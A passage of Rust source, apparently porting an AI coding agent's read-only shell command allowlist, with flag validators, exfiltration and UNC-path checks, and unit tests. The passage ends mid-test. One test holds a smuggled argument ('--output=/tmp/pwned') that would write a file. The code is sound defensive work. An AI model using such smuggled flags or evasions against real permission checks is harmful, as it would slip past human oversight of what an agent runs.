                            ("-e", FlagArgType::String),
                            ("--user", FlagArgType::String),
                            ("-u", FlagArgType::String),
                            ("--created", FlagArgType::String),
                            ("--commit", FlagArgType::String),
                            ("-c", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("run")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh run view",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--log", FlagArgType::None),
                            ("--log-failed", FlagArgType::None),
                            ("--exit-status", FlagArgType::None),
                            ("--verbose", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("--json", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--job", FlagArgType::String),
                            ("-j", FlagArgType::String),
                            ("--attempt", FlagArgType::Number),
                            ("-a", FlagArgType::Number),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("auth")
                && words.get(2).map(String::as_str) == Some("status")
            {
                return Some((
                    "gh auth status",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--active", FlagArgType::None),
                            ("-a", FlagArgType::None),
                            ("--hostname", FlagArgType::String),
                            ("-h", FlagArgType::String),
                            ("--json", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("pr")
                && words.get(2).map(String::as_str) == Some("status")
            {
                return Some((
                    "gh pr status",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--conflict-status", FlagArgType::None),
                            ("-c", FlagArgType::None),
                            ("--json", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("issue")
                && words.get(2).map(String::as_str) == Some("status")
            {
                return Some((
                    "gh issue status",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--json", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("release")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh release list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--exclude-drafts", FlagArgType::None),
                            ("--exclude-pre-releases", FlagArgType::None),
                            ("--json", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--order", FlagArgType::String),
                            ("-O", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("release")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh release view",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--json", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("workflow")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh workflow list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--all", FlagArgType::None),
                            ("-a", FlagArgType::None),
                            ("--json", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("workflow")
                && words.get(2).map(String::as_str) == Some("view")
            {
                return Some((
                    "gh workflow view",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--ref", FlagArgType::String),
                            ("-r", FlagArgType::String),
                            ("--yaml", FlagArgType::None),
                            ("-y", FlagArgType::None),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("label")
                && words.get(2).map(String::as_str) == Some("list")
            {
                return Some((
                    "gh label list",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--json", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--order", FlagArgType::String),
                            ("--search", FlagArgType::String),
                            ("-S", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("search")
                && words.get(2).map(String::as_str) == Some("repos")
            {
                return Some((
                    "gh search repos",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--archived", FlagArgType::None),
                            ("--created", FlagArgType::String),
                            ("--followers", FlagArgType::String),
                            ("--forks", FlagArgType::String),
                            ("--good-first-issues", FlagArgType::String),
                            ("--help-wanted-issues", FlagArgType::String),
                            ("--include-forks", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--language", FlagArgType::String),
                            ("--license", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--match", FlagArgType::String),
                            ("--number-topics", FlagArgType::String),
                            ("--order", FlagArgType::String),
                            ("--owner", FlagArgType::String),
                            ("--size", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--stars", FlagArgType::String),
                            ("--topic", FlagArgType::String),
                            ("--updated", FlagArgType::String),
                            ("--visibility", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("search")
                && words.get(2).map(String::as_str) == Some("issues")
            {
                return Some((
                    "gh search issues",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--app", FlagArgType::String),
                            ("--assignee", FlagArgType::String),
                            ("--author", FlagArgType::String),
                            ("--closed", FlagArgType::String),
                            ("--commenter", FlagArgType::String),
                            ("--comments", FlagArgType::String),
                            ("--created", FlagArgType::String),
                            ("--include-prs", FlagArgType::None),
                            ("--interactions", FlagArgType::String),
                            ("--involves", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--label", FlagArgType::String),
                            ("--language", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--locked", FlagArgType::None),
                            ("--match", FlagArgType::String),
                            ("--mentions", FlagArgType::String),
                            ("--milestone", FlagArgType::String),
                            ("--no-assignee", FlagArgType::None),
                            ("--no-label", FlagArgType::None),
                            ("--no-milestone", FlagArgType::None),
                            ("--no-project", FlagArgType::None),
                            ("--order", FlagArgType::String),
                            ("--owner", FlagArgType::String),
                            ("--project", FlagArgType::String),
                            ("--reactions", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--state", FlagArgType::String),
                            ("--team-mentions", FlagArgType::String),
                            ("--updated", FlagArgType::String),
                            ("--visibility", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("search")
                && words.get(2).map(String::as_str) == Some("prs")
            {
                return Some((
                    "gh search prs",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--app", FlagArgType::String),
                            ("--assignee", FlagArgType::String),
                            ("--author", FlagArgType::String),
                            ("--base", FlagArgType::String),
                            ("-B", FlagArgType::String),
                            ("--checks", FlagArgType::String),
                            ("--closed", FlagArgType::String),
                            ("--commenter", FlagArgType::String),
                            ("--comments", FlagArgType::String),
                            ("--created", FlagArgType::String),
                            ("--draft", FlagArgType::None),
                            ("--head", FlagArgType::String),
                            ("-H", FlagArgType::String),
                            ("--interactions", FlagArgType::String),
                            ("--involves", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--label", FlagArgType::String),
                            ("--language", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--locked", FlagArgType::None),
                            ("--match", FlagArgType::String),
                            ("--mentions", FlagArgType::String),
                            ("--merged", FlagArgType::None),
                            ("--merged-at", FlagArgType::String),
                            ("--milestone", FlagArgType::String),
                            ("--no-assignee", FlagArgType::None),
                            ("--no-label", FlagArgType::None),
                            ("--no-milestone", FlagArgType::None),
                            ("--no-project", FlagArgType::None),
                            ("--order", FlagArgType::String),
                            ("--owner", FlagArgType::String),
                            ("--project", FlagArgType::String),
                            ("--reactions", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--review", FlagArgType::String),
                            ("--review-requested", FlagArgType::String),
                            ("--reviewed-by", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--state", FlagArgType::String),
                            ("--team-mentions", FlagArgType::String),
                            ("--updated", FlagArgType::String),
                            ("--visibility", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("search")
                && words.get(2).map(String::as_str) == Some("commits")
            {
                return Some((
                    "gh search commits",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--author", FlagArgType::String),
                            ("--author-date", FlagArgType::String),
                            ("--author-email", FlagArgType::String),
                            ("--author-name", FlagArgType::String),
                            ("--committer", FlagArgType::String),
                            ("--committer-date", FlagArgType::String),
                            ("--committer-email", FlagArgType::String),
                            ("--committer-name", FlagArgType::String),
                            ("--hash", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--merge", FlagArgType::None),
                            ("--order", FlagArgType::String),
                            ("--owner", FlagArgType::String),
                            ("--parent", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--sort", FlagArgType::String),
                            ("--tree", FlagArgType::String),
                            ("--visibility", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if internal
                && words.first().map(String::as_str) == Some("gh")
                && words.get(1).map(String::as_str) == Some("search")
                && words.get(2).map(String::as_str) == Some("code")
            {
                return Some((
                    "gh search code",
                    3,
                    CommandConfig {
                        flags: &[
                            ("--extension", FlagArgType::String),
                            ("--filename", FlagArgType::String),
                            ("--json", FlagArgType::String),
                            ("--language", FlagArgType::String),
                            ("--limit", FlagArgType::Number),
                            ("-L", FlagArgType::Number),
                            ("--match", FlagArgType::String),
                            ("--owner", FlagArgType::String),
                            ("--repo", FlagArgType::String),
                            ("-R", FlagArgType::String),
                            ("--size", FlagArgType::String),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            None
        }
        "docker" => {
            if words.first().map(String::as_str) == Some("docker")
                && words.get(1).map(String::as_str) == Some("logs")
            {
                return Some((
                    "docker logs",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--follow", FlagArgType::None),
                            ("-f", FlagArgType::None),
                            ("--tail", FlagArgType::String),
                            ("-n", FlagArgType::String),
                            ("--timestamps", FlagArgType::None),
                            ("-t", FlagArgType::None),
                            ("--since", FlagArgType::String),
                            ("--until", FlagArgType::String),
                            ("--details", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            if words.first().map(String::as_str) == Some("docker")
                && words.get(1).map(String::as_str) == Some("inspect")
            {
                return Some((
                    "docker inspect",
                    2,
                    CommandConfig {
                        flags: &[
                            ("--format", FlagArgType::String),
                            ("-f", FlagArgType::String),
                            ("--type", FlagArgType::String),
                            ("--size", FlagArgType::None),
                            ("-s", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            None
        }
        "rg" => {
            if words.first().map(String::as_str) == Some("rg") {
                return Some((
                    "rg",
                    1,
                    CommandConfig {
                        flags: &[
                            ("-e", FlagArgType::String),
                            ("--regexp", FlagArgType::String),
                            ("-f", FlagArgType::String),
                            ("-i", FlagArgType::None),
                            ("--ignore-case", FlagArgType::None),
                            ("-S", FlagArgType::None),
                            ("--smart-case", FlagArgType::None),
                            ("-F", FlagArgType::None),
                            ("--fixed-strings", FlagArgType::None),
                            ("-w", FlagArgType::None),
                            ("--word-regexp", FlagArgType::None),
                            ("-v", FlagArgType::None),
                            ("--invert-match", FlagArgType::None),
                            ("-c", FlagArgType::None),
                            ("--count", FlagArgType::None),
                            ("-l", FlagArgType::None),
                            ("--files-with-matches", FlagArgType::None),
                            ("--files-without-match", FlagArgType::None),
                            ("-n", FlagArgType::None),
                            ("--line-number", FlagArgType::None),
                            ("-o", FlagArgType::None),
                            ("--only-matching", FlagArgType::None),
                            ("-A", FlagArgType::Number),
                            ("--after-context", FlagArgType::Number),
                            ("-B", FlagArgType::Number),
                            ("--before-context", FlagArgType::Number),
                            ("-C", FlagArgType::Number),
                            ("--context", FlagArgType::Number),
                            ("-H", FlagArgType::None),
                            ("-h", FlagArgType::None),
                            ("--heading", FlagArgType::None),
                            ("--no-heading", FlagArgType::None),
                            ("-q", FlagArgType::None),
                            ("--quiet", FlagArgType::None),
                            ("--column", FlagArgType::None),
                            ("-g", FlagArgType::String),
                            ("--glob", FlagArgType::String),
                            ("-t", FlagArgType::String),
                            ("--type", FlagArgType::String),
                            ("-T", FlagArgType::String),
                            ("--type-not", FlagArgType::String),
                            ("--type-list", FlagArgType::None),
                            ("--hidden", FlagArgType::None),
                            ("--no-ignore", FlagArgType::None),
                            ("-u", FlagArgType::None),
                            ("-m", FlagArgType::Number),
                            ("--max-count", FlagArgType::Number),
                            ("-d", FlagArgType::Number),
                            ("--max-depth", FlagArgType::Number),
                            ("-a", FlagArgType::None),
                            ("--text", FlagArgType::None),
                            ("-z", FlagArgType::None),
                            ("-L", FlagArgType::None),
                            ("--follow", FlagArgType::None),
                            ("--color", FlagArgType::String),
                            ("--json", FlagArgType::None),
                            ("--stats", FlagArgType::None),
                            ("--help", FlagArgType::None),
                            ("--version", FlagArgType::None),
                            ("--debug", FlagArgType::None),
                            ("--", FlagArgType::None),
                        ],
                        respects_double_dash: true,
                    },
                ));
            }
            None
        }
        "pyright" => {
            if words.first().map(String::as_str) == Some("pyright") {
                return Some((
                    "pyright",
                    1,
                    CommandConfig {
                        flags: &[
                            ("--outputjson", FlagArgType::None),
                            ("--project", FlagArgType::String),
                            ("-p", FlagArgType::String),
                            ("--pythonversion", FlagArgType::String),
                            ("--pythonplatform", FlagArgType::String),
                            ("--typeshedpath", FlagArgType::String),
                            ("--venvpath", FlagArgType::String),
                            ("--level", FlagArgType::String),
                            ("--stats", FlagArgType::None),
                            ("--verbose", FlagArgType::None),
                            ("--version", FlagArgType::None),
                            ("--dependencies", FlagArgType::None),
                            ("--warnings", FlagArgType::None),
                        ],
                        respects_double_dash: false,
                    },
                ));
            }
            None
        }
        _ => None,
    }
}

/// Maps to: CC `EXTERNAL_READONLY_COMMANDS`.
pub const EXTERNAL_READONLY_COMMANDS: &[&str] = &["docker ps", "docker images"];

/// Exact command-key inventories exported by CC's shared owner. These are
/// intentionally separate from BashTool's private command maps.
pub const GIT_READ_ONLY_COMMAND_NAMES: &[&str] = &[
    "git diff",
    "git log",
    "git show",
    "git shortlog",
    "git reflog",
    "git stash list",
    "git ls-remote",
    "git status",
    "git blame",
    "git ls-files",
    "git config --get",
    "git remote show",
    "git remote",
    "git merge-base",
    "git rev-parse",
    "git rev-list",
    "git describe",
    "git cat-file",
    "git for-each-ref",
    "git grep",
    "git stash show",
    "git worktree list",
    "git tag",
    "git branch",
];

pub const GH_READ_ONLY_COMMAND_NAMES: &[&str] = &[
    "gh pr view",
    "gh pr list",
    "gh pr diff",
    "gh pr checks",
    "gh issue view",
    "gh issue list",
    "gh repo view",
    "gh run list",
    "gh run view",
    "gh auth status",
    "gh pr status",
    "gh issue status",
    "gh release list",
    "gh release view",
    "gh workflow list",
    "gh workflow view",
    "gh label list",
    "gh search repos",
    "gh search issues",
    "gh search prs",
    "gh search commits",
    "gh search code",
];

pub const DOCKER_READ_ONLY_COMMAND_NAMES: &[&str] = &["docker logs", "docker inspect"];
pub const RIPGREP_READ_ONLY_COMMAND_NAMES: &[&str] = &["rg"];
pub const PYRIGHT_READ_ONLY_COMMAND_NAMES: &[&str] = &["pyright"];

#[derive(Clone, Copy, Debug, Default)]
pub struct ValidateFlagsOptions<'a> {
    pub command_name: Option<&'a str>,
    pub raw_command: Option<&'a str>,
    pub xargs_target_commands: Option<&'a [&'a str]>,
}

fn flag_arg_type(config: CommandConfig, flag: &str) -> Option<FlagArgType> {
    config
        .flags
        .iter()
        .find_map(|(candidate, arg_type)| (*candidate == flag).then_some(*arg_type))
}

fn matches_flag_pattern(value: &str) -> bool {
    let bytes = value.as_bytes();
    bytes.len() >= 2
        && bytes[0] == b'-'
        && (bytes[1].is_ascii_alphanumeric() || matches!(bytes[1], b'_' | b'-'))
}

/// Maps to: CC `validateFlagArgument(...)`.
pub fn validate_flag_argument(value: &str, arg_type: FlagArgType) -> bool {
    match arg_type {
        FlagArgType::None => false,
        FlagArgType::Number => !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit()),
        FlagArgType::String => true,
        FlagArgType::Char => value.encode_utf16().count() == 1,
        FlagArgType::Braces => value == "{}",
        FlagArgType::Eof => value == "EOF",
    }
}

/// Maps to: CC `validateFlags(...)`. In particular, this preserves CC's
/// `hasEquals` distinction, arg-taking bundle rejection, attached grep/rg
/// numeric handling, git numeric shorthand, and `respectsDoubleDash` rule.
pub fn validate_flags(
    tokens: &[String],
    start_index: usize,
    config: CommandConfig,
    options: ValidateFlagsOptions<'_>,
) -> bool {
    let mut index = start_index;
    while index < tokens.len() {
        let mut token = tokens[index].as_str();
        if token.is_empty() {
            index += 1;
            continue;
        }

        if let Some(targets) = options.xargs_target_commands
            && options.command_name == Some("xargs")
            && (!token.starts_with('-') || token == "--")
        {
            if token == "--" && index + 1 < tokens.len() {
                index += 1;
                token = tokens[index].as_str();
            }
            if targets.contains(&token) {
                break;
            }
            return false;
        }

        if token == "--" {
            if config.respects_double_dash {
                break;
            }
            index += 1;
            continue;
        }

        if token.len() > 1 && token.starts_with('-') && matches_flag_pattern(token) {
            let (flag, inline_value, has_equals) = match token.split_once('=') {
                Some((flag, value)) => (flag, value, true),
                None => (token, "", false),
            };
            if flag.is_empty() {
                return false;
            }

            let Some(arg_type) = flag_arg_type(config, flag) else {
                if options.command_name == Some("git")
                    && flag.len() > 1
                    && flag.as_bytes()[1..]
                        .iter()
                        .all(|byte| byte.is_ascii_digit())
                {
                    index += 1;
                    continue;
                }

                if matches!(options.command_name, Some("grep" | "rg"))
                    && flag.starts_with('-')
                    && !flag.starts_with("--")
                    && flag.len() > 2
                {
                    let potential_flag = &flag[..2];
                    let potential_value = &flag[2..];
                    if potential_value.bytes().all(|byte| byte.is_ascii_digit())
                        && !potential_value.is_empty()
                        && let Some(attached_type) = flag_arg_type(config, potential_flag)
                        && matches!(attached_type, FlagArgType::Number | FlagArgType::String)
                        && validate_flag_argument(potential_value, attached_type)
                    {
                        index += 1;
                        continue;
                    }
                }

                if flag.starts_with('-') && !flag.starts_with("--") && flag.len() > 2 {
                    for character in flag[1..].chars() {
                        let single_flag = format!("-{character}");
                        if flag_arg_type(config, &single_flag) != Some(FlagArgType::None) {
                            return false;
                        }
                    }
                    index += 1;
                    continue;
                }
                return false;
            };

            if arg_type == FlagArgType::None {
                if has_equals {
                    return false;
                }
                index += 1;
                continue;
            }

            let argument;
            if has_equals {
                argument = inline_value;
                index += 1;
            } else {
                let Some(next) = tokens.get(index + 1).map(String::as_str) else {
                    return false;
                };
                if next.len() > 1 && next.starts_with('-') && matches_flag_pattern(next) {
                    return false;
                }
                argument = next;
                index += 2;
            }

            if arg_type == FlagArgType::String && argument.starts_with('-') {
                let reverse_git_sort = flag == "--sort"
                    && options.command_name == Some("git")
                    && argument
                        .as_bytes()
                        .get(1)
                        .is_some_and(u8::is_ascii_alphabetic);
                if !reverse_git_sort {
                    return false;
                }
            }
            if !validate_flag_argument(argument, arg_type) {
                return false;
            }
        } else {
            index += 1;
        }
    }
    true
}

fn has_short_list_flag(token: &str) -> bool {
    token == "-l"
        || token == "--list"
        || (token.starts_with('-')
            && !token.starts_with("--")
            && token.len() > 2
            && !token.contains('=')
            && token[1..].contains('l'))
}

fn git_tag_is_dangerous(args: &[String]) -> bool {
    const FLAGS_WITH_ARGS: &[&str] = &[
        "--contains",
        "--no-contains",
        "--merged",
        "--no-merged",
        "--points-at",
        "--sort",
        "--format",
        "-n",
    ];
    let mut index = 0;
    let mut seen_list_flag = false;
    let mut seen_double_dash = false;
    while index < args.len() {
        let token = args[index].as_str();
        if token.is_empty() {
            index += 1;
            continue;
        }
        if token == "--" && !seen_double_dash {
            seen_double_dash = true;
            index += 1;
            continue;
        }
        if !seen_double_dash && token.starts_with('-') {
            seen_list_flag |= has_short_list_flag(token);
            if token.contains('=') {
                index += 1;
            } else if FLAGS_WITH_ARGS.contains(&token) {
                index += 2;
            } else {
                index += 1;
            }
        } else {
            if !seen_list_flag {
                return true;
            }
            index += 1;
        }
    }
    false
}

fn git_branch_is_dangerous(args: &[String]) -> bool {
    const FLAGS_WITH_ARGS: &[&str] = &["--contains", "--no-contains", "--points-at", "--sort"];
    const FLAGS_WITH_OPTIONAL_ARGS: &[&str] = &["--merged", "--no-merged"];
    let mut index = 0;
    let mut last_flag = "";
    let mut seen_list_flag = false;
    let mut seen_double_dash = false;
    while index < args.len() {
        let token = args[index].as_str();
        if token.is_empty() {
            index += 1;
            continue;
        }
        if token == "--" && !seen_double_dash {
            seen_double_dash = true;
            last_flag = "";
            index += 1;
            continue;
        }
        if !seen_double_dash && token.starts_with('-') {
            seen_list_flag |= has_short_list_flag(token);
            if let Some((flag, _)) = token.split_once('=') {
                last_flag = flag;
                index += 1;
            } else if FLAGS_WITH_ARGS.contains(&token) {
                last_flag = token;
                index += 2;
            } else {
                last_flag = token;
                index += 1;
            }
        } else {
            if !seen_list_flag && !FLAGS_WITH_OPTIONAL_ARGS.contains(&last_flag) {
                return true;
            }
            index += 1;
        }
    }
    false
}

fn gh_is_dangerous(args: &[String]) -> bool {
    args.iter().any(|token| {
        if token.is_empty() {
            return false;
        }
        let value = if token.starts_with('-') {
            let Some((_, value)) = token.split_once('=') else {
                return false;
            };
            if value.is_empty() {
                return false;
            }
            value
        } else {
            token.as_str()
        };
        if !value.contains('/') && !value.contains("://") && !value.contains('@') {
            return false;
        }
        value.contains("://")
            || value.contains('@')
            || value.bytes().filter(|byte| *byte == b'/').count() >= 2
    })
}

/// Maps to each `additionalCommandIsDangerousCallback` in the shared maps.
pub fn additional_command_is_dangerous(
    command_name: &str,
    _raw_command: &str,
    args: &[String],
) -> bool {
    match command_name {
        "git reflog" => {
            for token in args {
                if token.is_empty() || token.starts_with('-') {
                    continue;
                }
                return matches!(token.as_str(), "expire" | "delete" | "exists");
            }
            false
        }
        "git remote show" => {
            let positional = args
                .iter()
                .filter(|token| token.as_str() != "-n")
                .collect::<Vec<_>>();
            positional.len() != 1
                || !positional[0]
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-'))
        }
        "git remote" => args
            .iter()
            .any(|token| !matches!(token.as_str(), "-v" | "--verbose")),
        "git tag" => git_tag_is_dangerous(args),
        "git branch" => git_branch_is_dangerous(args),
        "pyright" => args
            .iter()
            .any(|token| matches!(token.as_str(), "--watch" | "-w")),
        name if name.starts_with("gh ") && !name.starts_with("gh search ") => gh_is_dangerous(args),
        _ => false,
    }
}

/// Resolves and validates one command against the complete shared CC maps.
/// `None` means the command does not belong to this source owner; `Some(false)`
/// means it matched but failed flags, callback, or exfiltration checks.
pub fn validate_shared_command(
    raw_command: &str,
    words: &[String],
    internal: bool,
) -> Option<bool> {
    let (name, command_tokens, config) = command_config(words, internal)?;
    let args = &words[command_tokens..];
    if words.iter().skip(command_tokens).any(|token| {
        token.contains('$')
            || (token.contains('{') && (token.contains(',') || token.contains("..")))
    }) {
        return Some(false);
    }
    if name == "git ls-remote"
        && args.iter().any(|token| {
            !token.starts_with('-')
                && (token.contains("://")
                    || token.contains('@')
                    || token.contains(':')
                    || token.contains('$'))
        })
    {
        return Some(false);
    }
    let valid = validate_flags(
        words,
        command_tokens,
        config,
        ValidateFlagsOptions {
            command_name: words.first().map(String::as_str),
            raw_command: Some(raw_command),
            xargs_target_commands: None,
        },
    );
    Some(valid && !additional_command_is_dangerous(name, raw_command, args))
}

/// Maps to: CC `containsVulnerableUncPath(...)`. CC only applies this check
/// on Windows; URL `://` separators are excluded from forward-slash UNC.
pub fn contains_vulnerable_unc_path(path_or_command: &str) -> bool {
    contains_vulnerable_unc_path_for_platform(path_or_command, cfg!(windows))
}

fn contains_vulnerable_unc_path_for_platform(path_or_command: &str, is_windows: bool) -> bool {
    if !is_windows {
        return false;
    }
    let lowercase = path_or_command.to_ascii_lowercase();
    if lowercase.contains("@ssl@")
        && lowercase.split("@ssl@").skip(1).any(|tail| {
            tail.bytes()
                .next()
                .is_some_and(|byte| byte.is_ascii_digit())
        })
        || lowercase.split('@').any(|tail| {
            let digits = tail.bytes().take_while(u8::is_ascii_digit).count();
            digits > 0 && tail[digits..].to_ascii_lowercase().starts_with("@ssl")
        })
        || lowercase.contains("davwwwroot")
    {
        return true;
    }

    let bytes = path_or_command.as_bytes();
    for index in 0..bytes.len().saturating_sub(1) {
        let backslash_unc = bytes[index] == b'\\' && bytes[index + 1] == b'\\';
        let slash_unc = bytes[index] == b'/'
            && bytes[index + 1] == b'/'
            && (index == 0 || bytes[index - 1] != b':');
        if backslash_unc || slash_unc {
            let mut cursor = index + 2;
            if cursor >= bytes.len() || bytes[cursor].is_ascii_whitespace() {
                continue;
            }
            while cursor < bytes.len()
                && !bytes[cursor].is_ascii_whitespace()
                && !matches!(bytes[cursor], b'/' | b'\\')
            {
                cursor += 1;
            }
            if cursor == bytes.len()
                || bytes[cursor].is_ascii_whitespace()
                || matches!(bytes[cursor], b'/' | b'\\')
            {
                return true;
            }
        }
        if bytes[index] == b'/' && bytes[index + 1] == b'\\' {
            let slashes = bytes[index + 1..]
                .iter()
                .take_while(|byte| **byte == b'\\')
                .count();
            if slashes >= 2 && index + 1 + slashes < bytes.len() {
                return true;
            }
        }
        if bytes[index] == b'\\' {
            let slashes = bytes[index..]
                .iter()
                .take_while(|byte| **byte == b'\\')
                .count();
            if slashes >= 2
                && index + slashes < bytes.len()
                && bytes[index + slashes] == b'/'
                && index + slashes + 1 < bytes.len()
            {
                return true;
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn words(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|part| (*part).to_string()).collect()
    }

    #[test]
    fn shared_command_inventory_matches_cc_2_1_88() {
        assert_eq!(GIT_READ_ONLY_COMMAND_NAMES.len(), 24);
        assert_eq!(GH_READ_ONLY_COMMAND_NAMES.len(), 22);
        assert_eq!(DOCKER_READ_ONLY_COMMAND_NAMES.len(), 2);
        assert_eq!(RIPGREP_READ_ONLY_COMMAND_NAMES.len(), 1);
        assert_eq!(PYRIGHT_READ_ONLY_COMMAND_NAMES.len(), 1);
        assert_eq!(EXTERNAL_READONLY_COMMANDS, ["docker ps", "docker images"]);
        for name in GIT_READ_ONLY_COMMAND_NAMES {
            assert!(command_config(&words(&name.split(' ').collect::<Vec<_>>()), false).is_some());
        }
        for name in GH_READ_ONLY_COMMAND_NAMES {
            let command = words(&name.split(' ').collect::<Vec<_>>());
            assert_eq!(
                command_config(&command, true).is_some(),
                cfg!(feature = "anthropic_internal")
            );
            assert!(command_config(&command, false).is_none());
        }
    }

    #[test]
    fn validates_required_values_equals_bundles_and_double_dash_exactly() {
        assert_eq!(
            validate_shared_command(
                "git diff -S -- --output=/tmp/pwned",
                &words(&["git", "diff", "-S", "--", "--output=/tmp/pwned"]),
                false
            ),
            Some(false)
        );
        assert_eq!(
            validate_shared_command(
                "git log --max-count=3",
                &words(&["git", "log", "--max-count=3"]),
                false
            ),
            Some(true)
        );
        assert_eq!(
            validate_shared_command(
                "git log --max-count=",
                &words(&["git", "log", "--max-count="]),
                false
            ),
            Some(false)
        );
        assert_eq!(
            validate_shared_command("git branch -av", &words(&["git", "branch", "-av"]), false),
            Some(true)
        );
        assert_eq!(
            validate_shared_command(
                "pyright -- --watch",
                &words(&["pyright", "--", "--watch"]),
                false
            ),
            Some(false)
        );
    }

    #[test]
    fn callbacks_block_git_mutations_and_gh_exfiltration() {
        for command in [
            words(&["git", "branch", "new-branch"]),
            words(&["git", "branch", "--", "-l"]),
            words(&["git", "branch", "--abbrev", "8"]),
            words(&["git", "tag", "release"]),
            words(&["git", "tag", "--", "-l"]),
            words(&["git", "reflog", "expire", "--all"]),
            words(&["git", "remote", "add", "origin"]),
        ] {
            assert_eq!(validate_shared_command("", &command, false), Some(false));
        }
        for command in [
            words(&["git", "branch"]),
            words(&["git", "branch", "-li", "pattern"]),
            words(&["git", "tag", "--list", "v*"]),
            words(&["git", "reflog", "show", "HEAD"]),
            words(&["git", "remote", "-v"]),
            words(&["git", "remote", "show", "origin"]),
        ] {
            assert_eq!(validate_shared_command("", &command, false), Some(true));
        }
        let unsafe_gh = validate_shared_command(
            "",
